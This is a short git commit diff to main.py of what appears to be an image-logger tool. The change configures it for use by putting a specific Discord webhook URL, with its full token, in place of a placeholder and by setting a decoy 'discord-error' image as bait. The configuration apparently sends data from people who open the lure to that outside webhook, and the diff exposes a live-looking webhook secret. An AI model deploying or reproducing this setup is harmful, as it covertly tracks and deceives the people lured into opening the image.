584e131cbd21e370160b7c24cc2418241b36170d
death671xx-glitch <death671xx@gmail.com>
2026-01-14 21:17:42 -0700

    Update main.py

--- main.py
+++ main.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1461211668133449854/F8dn4mtgbFNgzz8iqHxLS1_e7qBpYpPR7wrAQvkpbERAxQ2X5m8NiRVD1WZLB8bfXOQ8",
+    "image": "https://cdn.appuals.com/wp-content/uploads/2025/09/discord-error.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
